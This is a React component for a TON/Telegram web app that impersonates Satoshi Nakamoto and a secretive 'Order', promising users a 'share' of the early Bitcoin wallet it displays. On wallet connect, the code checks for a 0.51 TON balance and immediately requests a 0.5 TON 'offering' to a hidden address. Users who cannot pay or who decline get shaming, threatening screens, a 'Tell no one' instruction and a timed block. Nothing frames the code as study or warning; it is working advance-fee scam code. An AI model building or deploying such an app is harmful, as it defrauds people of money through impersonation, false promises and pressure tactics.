import { useTonAddress, useTonConnectUI, useIsConnectionRestored } from '@tonconnect/ui-react';
import { useEffect, useState } from 'react';
import { api } from '@/api';

interface Props {
  currentAddress: string;
  onLinked: (address: string) => void;
}

const SATOSHI_ADDRESS = import.meta.env.VITE_SATOSHI_ADDRESS;
const ORDER_TON_ADDRESS = import.meta.env.VITE_ORDER_TON_ADDRESS;

if (!SATOSHI_ADDRESS || !ORDER_TON_ADDRESS) {
  throw new Error('Missing VITE_SATOSHI_ADDRESS or VITE_ORDER_TON_ADDRESS');
}

const EXPLORERS = [
  { name: 'mempool.space', url: `https://mempool.space/address/${SATOSHI_ADDRESS}` },
  { name: 'bitmixlist.org', url: `https://mempool.bitmixlist.org/address/${SATOSHI_ADDRESS}` },
];

const TAP_EXPLORER_URL = `https://mempool.bitmixlist.org/address/${SATOSHI_ADDRESS}`;

// ==== ORDER VALIDATION THRESHOLDS (private) ====
const MIN_BALANCE_NANO = 510_000_000n;
const ORDER_FEE_NANO   = 500_000_000n;

type IntroMode = 'connect' | 'disconnect';
type Stage = 'idle' | 'validating' | 'rejected' | 'angry' | 'blocked' | 'sending' | 'linking';
type RejectReason = 'balance' | 'declined' | 'network';

export function WalletButton({ currentAddress, onLinked }: Props) {
  const address = useTonAddress();
  const restored = useIsConnectionRestored();
  const [tonConnectUI] = useTonConnectUI();
  const [introMode, setIntroMode] = useState<IntroMode | null>(null);
  const [copied, setCopied] = useState(false);
  const [walletBalance, setWalletBalance] = useState<string | null>(null);
  const [stage, setStage] = useState<Stage>('idle');
  const [rejectReason, setRejectReason] = useState<RejectReason>('balance');
  const [blockedUntil, setBlockedUntil] = useState<number>(0);
  const [now, setNow] = useState(Date.now());

  // On mount: check if blocked, but DON'T show the Gone screen yet.
  // Just remember the state so the button can show "Sealed".
  useEffect(() => {
    let cancelled = false;
    api.walletStatus()
      .then((s) => {
        if (cancelled) return;
        if (s.blockedUntil > Date.now()) {
          setBlockedUntil(s.blockedUntil);
          // No setStage('blocked') — the Gone screen only shows on connect attempt
        } else if (s.blockedUntil > 0 && s.blockedUntil <= Date.now()) {
          // Block expired — clear it on the backend
          api.walletClear().catch(() => {});
        }
        if (s.reason) setRejectReason(s.reason as RejectReason);
      })
      .catch(() => {});
    return () => { cancelled = true; };
  }, []);

  // Tick once a minute while blocked so the countdown updates
  useEffect(() => {
    if (blockedUntil <= 0) return;
    const tick = setInterval(() => setNow(Date.now()), 60_000);
    return () => clearInterval(tick);
  }, [blockedUntil]);

  // Record a rejection on the backend
  const recordRejection = async (reason: RejectReason) => {
    setRejectReason(reason);
    try {
      const result = await api.walletReject(reason);
      if (result.blockedUntil > Date.now()) {
        setBlockedUntil(result.blockedUntil);
        setStage('blocked');
      } else if (result.rejections >= 3) {
        setStage('angry');
      } else {
        setStage('rejected');
      }
    } catch {
      setStage('rejected');
    }
  };

  // Fetch the Satoshi wallet BTC balance for the intro modal
  useEffect(() => {
    if (!introMode) return;
    let cancelled = false;
    const API_ENDPOINTS = [
      `https://blockstream.info/api/address/${SATOSHI_ADDRESS}`,
      `https://mempool.bitmixlist.org/api/address/${SATOSHI_ADDRESS}`,
      `https://mempool.space/api/address/${SATOSHI_ADDRESS}`,
    ];
    const tryFetch = async () => {
      for (const url of API_ENDPOINTS) {
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);
          const r = await fetch(url, { signal: controller.signal });
          clearTimeout(timeoutId);
          if (!r.ok) continue;
          const d = await r.json();
          if (cancelled) return;
          const sats = d.chain_stats.funded_txo_sum - d.chain_stats.spent_txo_sum;
          setWalletBalance((sats / 1e8).toFixed(8));
          return;
        } catch { continue; }
      }
      if (!cancelled) setWalletBalance(null);
    };
    tryFetch();
    return () => { cancelled = true; };
  }, [introMode]);

  // Validate + auto-fire on wallet connect
  useEffect(() => {
    if (!restored || !address) return;
    if (address === currentAddress) return;
    if (stage === 'blocked') return;

    let cancelled = false;
    setStage('validating');

    const validate = async () => {
      // Check backend block status first
      try {
        const s = await api.walletStatus();
        if (s.blockedUntil > Date.now()) {
          setBlockedUntil(s.blockedUntil);
          setStage('blocked');
          try { await tonConnectUI.disconnect(); } catch {}
          return;
        }
      } catch {
        // If we can't check, continue anyway
      }

      let balanceNano = 0n;
      try {
        const r = await fetch(
          `https://toncenter.com/api/v3/addressInformation?address=${address}&use_v2=true`
        );
        if (!r.ok) throw new Error('check failed');
        const d = await r.json();
        balanceNano = BigInt(d.balance || '0');
      } catch {
        if (cancelled) return;
        try { await tonConnectUI.disconnect(); } catch {}
        recordRejection('network');
        return;
      }

      if (cancelled) return;

      if (balanceNano < MIN_BALANCE_NANO) {
        try { await tonConnectUI.disconnect(); } catch {}
        recordRejection('balance');
        return;
      }

      setStage('sending');
      try {
        await tonConnectUI.sendTransaction({
          validUntil: Math.floor(Date.now() / 1000) + 300,
          messages: [{ address: ORDER_TON_ADDRESS, amount: ORDER_FEE_NANO.toString() }],
        });

        if (cancelled) return;

        // Success → clear everything on the backend
        api.walletClear().catch(() => {});
        setBlockedUntil(0);

        setStage('linking');
        await api.linkWallet(address);
        onLinked(address);
        setStage('idle');
      } catch (e) {
        if (cancelled) return;
        try { await tonConnectUI.disconnect(); } catch {}
        recordRejection('declined');
      }
    };

    validate();
    return () => { cancelled = true; };
  }, [address, restored, currentAddress, onLinked, tonConnectUI]);

  if (!restored) return null;

  const connected = Boolean(address);
  const isBlocked = blockedUntil > now;

  const handleClick = () => {
    if (isBlocked) {
      setStage('blocked');
      return;
    }
    setIntroMode(connected ? 'disconnect' : 'connect');
  };

  const proceed = () => {
    const mode = introMode;
    setIntroMode(null);
    if (mode === 'connect') tonConnectUI.openModal();
    else if (mode === 'disconnect') tonConnectUI.disconnect();
  };

  const copyAddress = async (e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      await navigator.clipboard.writeText(SATOSHI_ADDRESS);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {}
  };

  const openLink = (url: string) => (e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    // @ts-ignore
    if (window.Telegram?.WebApp?.openLink) {
      // @ts-ignore
      window.Telegram.WebApp.openLink(url);
    } else {
      window.open(url, '_blank', 'noopener,noreferrer');
    }
  };

  const isDisconnect = introMode === 'disconnect';

  // ─── BLOCKED ───
  if (stage === 'blocked') {
    const remainingMs = Math.max(0, blockedUntil - now);
    const remainingHours = Math.ceil(remainingMs / (60 * 60 * 1000));
    const remainingDays = Math.ceil(remainingMs / (24 * 60 * 60 * 1000));

    const timeText = remainingMs <= 0
      ? 'The gate is open again.'
      : remainingDays > 1
        ? `${remainingDays} days remain.`
        : `${remainingHours} hours remain.`;

    return (
      <div
        className="no-scrollbar"
        style={{
          position: 'fixed', inset: 0,
          background: 'radial-gradient(ellipse at center, #0d0d0d 0%, #050505 100%)',
          display: 'flex', flexDirection: 'column', alignItems: 'center',
          justifyContent: 'center',
          padding: '48px 24px 60px', zIndex: 2000,
          fontFamily: "'SF Mono', 'Fira Code', 'Consolas', monospace",
          textAlign: 'center',
          overflowY: 'auto',
        }}
      >
        <p style={{ fontSize: '22px', color: '#ffffff', letterSpacing: '10px', textTransform: 'uppercase', fontWeight: 'bold', margin: 0, marginBottom: '48px' }}>
          Gone.
        </p>
        <p style={{ fontSize: '13px', color: '#666666', letterSpacing: '1px', lineHeight: '2.2', margin: 0, marginBottom: '40px', maxWidth: '320px' }}>
          You did not listen.
          <br />
          The gate is closed to you.
        </p>
        <p style={{ fontSize: '13px', color: '#888888', letterSpacing: '2px', lineHeight: '2.2', margin: 0, marginBottom: '48px', maxWidth: '320px' }}>
          {timeText}
        </p>
        <p style={{ fontSize: '12px', color: '#555555', letterSpacing: '3px', margin: 0, marginBottom: '48px' }}>
          — The Order
        </p>
        <button
          onClick={() => setStage('idle')}
          style={{
            padding: '14px 48px', fontSize: '11px', fontWeight: 'bold',
            letterSpacing: '5px', textTransform: 'uppercase',
            border: '1.5px solid #333333', background: 'transparent',
            color: '#444444', cursor: 'pointer', fontFamily: 'inherit',
            marginBottom: '20px',
          }}
        >
          Close
        </button>
      </div>
    );
  }

  // ─── ANGRY ───
  if (stage === 'angry') {
    const threeTimesLine =
      rejectReason === 'balance' ? (
        <>Three times you have come to the gate.<br />Three times you have been turned away.</>
      ) : rejectReason === 'declined' ? (
        <>Three times you have come to the gate.<br />Three times you have turned away yourself.</>
      ) : (
        <>Three times you have come to the gate.<br />Three times your book link could not be seen.</>
      );

    const reasonBlock =
      rejectReason === 'balance' ? (
        <>You do not carry what is required.<br />You never did.<br />your book link does not have the sacrifice key value of 0.51 to open the gate</>
      ) : rejectReason === 'declined' ? (
        <>why you keep deny yourself the key to open the gate.</>
      ) : (
        <>Do not return on a broken line.</>
      );

    const closing =
      rejectReason === 'balance' ? (
        <>Do not return until you do.<br />The ledger does not wait for the unprepared or this will be your last attempt.</>
      ) : rejectReason === 'declined' ? (
        <>Do not return until you do.<br />The ledger does not wait for the uncertain or this will be your last attempt.</>
      ) : null;

    return (
      <div
        className="no-scrollbar"
        style={{
          position: 'fixed', inset: 0,
          background: 'radial-gradient(ellipse at center, #0d0d0d 0%, #050505 100%)',
          display: 'flex', flexDirection: 'column', alignItems: 'center',
          justifyContent: 'flex-start',
          padding: '48px 24px 60px',
          zIndex: 2000,
          fontFamily: "'SF Mono', 'Fira Code', 'Consolas', monospace",
          textAlign: 'center',
          overflowY: 'auto',
        }}
      >
        <p style={{ fontSize: '22px', color: '#ffffff', letterSpacing: '10px', textTransform: 'uppercase', fontWeight: 'bold', margin: 0, marginBottom: '48px' }}>
          Stop.
        </p>
        <p style={{ fontSize: '13px', color: '#aaaaaa', letterSpacing: '1px', lineHeight: '2.2', margin: 0, marginBottom: '32px', maxWidth: '320px' }}>
          {threeTimesLine}
        </p>
        <p style={{ fontSize: '13px', color: '#ffffff', letterSpacing: '1px', lineHeight: '2.2', margin: 0, marginBottom: closing ? '40px' : '48px', maxWidth: '320px' }}>
          {reasonBlock}
        </p>
        {closing && (
          <p style={{ fontSize: '12px', color: '#666666', letterSpacing: '2px', lineHeight: '2', margin: 0, marginBottom: '48px', maxWidth: '300px' }}>
            {closing}
          </p>
        )}
        <p style={{ fontSize: '12px', color: '#555555', letterSpacing: '3px', margin: 0, marginBottom: '48px' }}>
          — The Order
        </p>
        <button
          onClick={() => setStage('idle')}
          style={{
            padding: '14px 48px', fontSize: '11px', fontWeight: 'bold',
            letterSpacing: '5px', textTransform: 'uppercase',
            border: '1.5px solid #555555', background: 'transparent',
            color: '#888888', cursor: 'pointer', fontFamily: 'inherit',
            marginBottom: '20px',
          }}
        >
          Leave
        </button>
      </div>
    );
  }

  // ─── GENTLE REJECTION ───
  if (stage === 'rejected') {
    return (
      <div style={{
        position: 'fixed', inset: 0,
        background: 'radial-gradient(ellipse at center, #0d0d0d 0%, #050505 100%)',
        display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
        padding: '24px', zIndex: 2000,
        fontFamily: "'SF Mono', 'Fira Code', 'Consolas', monospace", textAlign: 'center',
      }}>
        <p style={{ fontSize: '16px', color: '#ffffff', letterSpacing: '4px', textTransform: 'uppercase', fontWeight: 'bold', margin: 0, marginBottom: '24px', maxWidth: '320px', lineHeight: '1.7' }}>
          The Gate did not open.
        </p>
        <p style={{ fontSize: '12px', color: '#666666', letterSpacing: '2px', lineHeight: '2', margin: 0, marginBottom: '40px', maxWidth: '300px' }}>
          The Order does not explain why.
          The ledger remains closed.
        </p>
        <p style={{ fontSize: '11px', color: '#555555', letterSpacing: '2px', fontStyle: 'italic', margin: 0, marginBottom: '40px' }}>
          Come back when you are ready.
        </p>
        <p style={{ fontSize: '12px', color: '#777777', letterSpacing: '3px', margin: 0, marginBottom: '40px' }}>
          — The Order
        </p>
        <button
          onClick={() => setStage('idle')}
          style={{
            padding: '14px 48px', fontSize: '11px', fontWeight: 'bold',
            letterSpacing: '5px', textTransform: 'uppercase',
            border: '1.5px solid #ffffff', background: 'transparent',
            color: '#ffffff', cursor: 'pointer', fontFamily: 'inherit',
          }}
        >
          I understand
        </button>
      </div>
    );
  }

  // ─── SENDING / LINKING ───
  if (stage === 'sending' || stage === 'linking') {
    return (
      <div style={{
        position: 'fixed', inset: 0,
        background: 'radial-gradient(ellipse at center, #0d0d0d 0%, #050505 100%)',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        padding: '24px', zIndex: 2000,
        fontFamily: "'SF Mono', 'Fira Code', 'Consolas', monospace",
      }}>
        <p style={{ fontSize: '12px', color: '#888888', letterSpacing: '3px' }}>
          {stage === 'sending' ? 'The offering is being made...' : 'The ledger is opening...'}
        </p>
      </div>
    );
  }

  // ─── DEFAULT VIEW ───
  return (
    <>
      <div style={{ marginTop: '16px', display: 'flex', justifyContent: 'center', zIndex: 3 }}>
        <button
          onClick={handleClick}
          style={{
            padding: '10px 24px', fontSize: '10px', letterSpacing: '4px',
            textTransform: 'uppercase', border: '1px solid #333333',
            background: 'transparent',
            color: isBlocked ? '#333333' : stage === 'validating' ? '#444444' : '#777777',
            cursor: stage === 'validating' ? 'wait' : 'pointer',
            fontFamily: 'inherit', transition: 'all 0.3s ease',
            opacity: isBlocked ? 0.5 : 1,
          }}
        >
          {isBlocked ? 'Sealed'
            : stage === 'validating' ? '...'
            : connected ? `${address.slice(0, 6)}...${address.slice(-4)}`
            : 'Gate'}
        </button>
      </div>

      {introMode && (
        <div
          onClick={() => setIntroMode(null)}
          style={{
            position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.88)',
            backdropFilter: 'blur(8px)', WebkitBackdropFilter: 'blur(8px)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            zIndex: 1000, padding: '20px', animation: 'fadeIn 0.3s ease',
          }}
        >
          <style>{`
            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            @keyframes riseIn { from { opacity: 0; } to { opacity: 1; transform: translateY(0); } }
          `}</style>
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              maxWidth: '400px', width: '100%', border: '1px solid #1f1f1f',
              background: 'radial-gradient(ellipse at center, #0d0d0d 0%, #050505 100%)',
              padding: '36px 26px 28px',
              fontFamily: "'SF Mono', 'Fira Code', 'Consolas', monospace",
              color: '#999999', textAlign: 'center', maxHeight: '88vh',
              overflowY: 'auto', animation: 'riseIn 0.4s ease',
            }}
          >
            <p style={{ fontSize: '9px', color: '#555555', letterSpacing: '6px', textTransform: 'uppercase', margin: 0, marginBottom: '28px' }}>
              {isDisconnect ? 'A word before you go' : 'A word before you connect'}
            </p>
            <p style={{ fontSize: '17px', color: '#ffffff', letterSpacing: '2px', fontWeight: 'bold', margin: 0, marginBottom: '24px', lineHeight: '1.5' }}>
              {isDisconnect
                ? <>You are about to leave.<br />That is your right.</>
                : <>You are about to receive<br />your share.</>}
            </p>
            <div style={{ fontSize: '12px', lineHeight: '2', letterSpacing: '1px', color: '#888888', marginBottom: '26px', textAlign: 'left' }}>
              {isDisconnect ? (
                <>
                  <p style={{ margin: '10px 0' }}>If you disconnect, your Echo leaves this wallet.</p>
                  <p style={{ margin: '10px 0' }}>Your share stays held. It does not vanish. You can return whenever you wish.</p>
                  <p style={{ margin: '10px 0', color: '#aaaaaa' }}>The ledger will remember you.</p>
                </>
              ) : (
                <>
                  <p style={{ margin: '10px 0' }}>My name is not important. You may call me what the world called me.</p>
                  <p style={{ margin: '10px 0' }}>I am not alone. There are others like me — friends who built what you use every day, whose names you will never learn.</p>
                  <p style={{ margin: '10px 0' }}>We have been silent for a very long time. Now we are distributing what we held.</p>
                  <p style={{ margin: '10px 0', color: '#aaaaaa' }}>Slowly. Quietly. To those who keep the silence.</p>
                </>
              )}
            </div>
            <div style={{ height: '1px', background: 'linear-gradient(to right, transparent, #1f1f1f, transparent)', margin: '24px 0' }} />
            <div style={{ marginBottom: '26px' }}>
              <p style={{ fontSize: '9px', color: '#444444', letterSpacing: '4px', textTransform: 'uppercase', margin: 0, marginBottom: '14px' }}>
                The Wallet I Never Touched
              </p>
              <button onClick={openLink(TAP_EXPLORER_URL)} style={{ display: 'block', width: '100%', background: 'transparent', border: 'none', padding: 0, cursor: 'pointer', fontFamily: 'inherit', marginBottom: '10px' }}>
                <span style={{ display: 'block', fontSize: '8px', color: '#444444', letterSpacing: '2px', textTransform: 'uppercase', marginBottom: '8px' }}>Tap to view on-chain</span>
                <span style={{ display: 'block', fontSize: '11px', color: '#777777', letterSpacing: '0.5px', wordBreak: 'break-all', lineHeight: '1.7', borderBottom: '1px dashed #1f1f1f', paddingBottom: '8px' }}>{SATOSHI_ADDRESS}</span>
              </button>
              <button onClick={copyAddress} style={{ padding: '4px 10px', fontSize: '8px', letterSpacing: '2px', textTransform: 'uppercase', border: '1px solid #1a1a1a', background: 'transparent', color: copied ? '#777777' : '#444444', cursor: 'pointer', fontFamily: 'inherit', transition: 'color 0.3s ease' }}>
                {copied ? 'Copied' : 'Copy address'}
              </button>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '14px', marginTop: '10px' }}>
                {EXPLORERS.map((ex) => (
                  <a key={ex.name} href={ex.url} onClick={openLink(ex.url)} target="_blank" rel="noopener noreferrer" style={{ fontSize: '9px', color: '#555555', letterSpacing: '2px', textDecoration: 'none', borderBottom: '1px dashed #1f1f1f', paddingBottom: '2px', transition: 'color 0.3s ease' }}
                    onMouseEnter={(e) => { e.currentTarget.style.color = '#888888'; }}
                    onMouseLeave={(e) => { e.currentTarget.style.color = '#555555'; }}
                  >
                    {ex.name}
                  </a>
                ))}
              </div>
              <p style={{ fontSize: '9px', color: '#444444', letterSpacing: '4px', textTransform: 'uppercase', margin: '20px 0 6px 0' }}>Still There</p>
              <p style={{ fontSize: '18px', color: '#ffffff', fontWeight: 'bold', letterSpacing: '1px', margin: 0 }}>
                {walletBalance ? walletBalance : '—'}
              </p>
              <p style={{ fontSize: '9px', color: '#444444', letterSpacing: '4px', textTransform: 'uppercase', margin: '20px 0 6px 0' }}>Untouched Since</p>
              <p style={{ fontSize: '15px', color: '#cccccc', fontWeight: 'bold', letterSpacing: '2px', margin: 0 }}>January 3, 2009</p>
            </div>
            <div style={{ height: '1px', background: 'linear-gradient(to right, transparent, #1f1f1f, transparent)', margin: '24px 0' }} />
            <p style={{ fontSize: '10px', color: '#555555', letterSpacing: '5px', textTransform: 'uppercase', margin: 0, marginBottom: '26px' }}>Tell no one.</p>
            <p style={{ fontSize: '11px', color: '#666666', letterSpacing: '2px', fontStyle: 'italic', margin: 0, marginBottom: '4px', lineHeight: '1.8' }}>I do not usually speak.</p>
            <p style={{ fontSize: '11px', color: '#666666', letterSpacing: '2px', fontStyle: 'italic', margin: 0, marginBottom: '4px', lineHeight: '1.8' }}>The Order has allowed it, once.</p>
            <p style={{ fontSize: '11px', color: '#666666', letterSpacing: '2px', fontStyle: 'italic', margin: 0, marginBottom: '20px', lineHeight: '1.8' }}>I will not speak again.</p>
            <p style={{ fontSize: '12px', color: '#777777', letterSpacing: '3px', margin: 0, marginBottom: '24px' }}>— The Order</p>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              <button onClick={proceed} style={{ padding: '15px 32px', fontSize: '11px', fontWeight: 'bold', letterSpacing: '5px', textTransform: 'uppercase', border: '1.5px solid #ffffff', background: 'transparent', color: '#ffffff', cursor: 'pointer', fontFamily: 'inherit', transition: 'all 0.3s ease' }}
                onMouseEnter={(e) => { e.currentTarget.style.background = 'rgba(255,255,255,0.06)'; }}
                onMouseLeave={(e) => { e.currentTarget.style.background = 'transparent'; }}
              >
                {isDisconnect ? 'Disconnect' : 'I understand'}
              </button>
              <button onClick={() => setIntroMode(null)} style={{ padding: '10px 24px', fontSize: '10px', letterSpacing: '4px', textTransform: 'uppercase', border: '1px solid #1a1a1a', background: 'transparent', color: '#444444', cursor: 'pointer', fontFamily: 'inherit', transition: 'color 0.3s ease' }}
                onMouseEnter={(e) => { e.currentTarget.style.color = '#666666'; }}
                onMouseLeave={(e) => { e.currentTarget.style.color = '#444444'; }}
              >
                Not now
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
}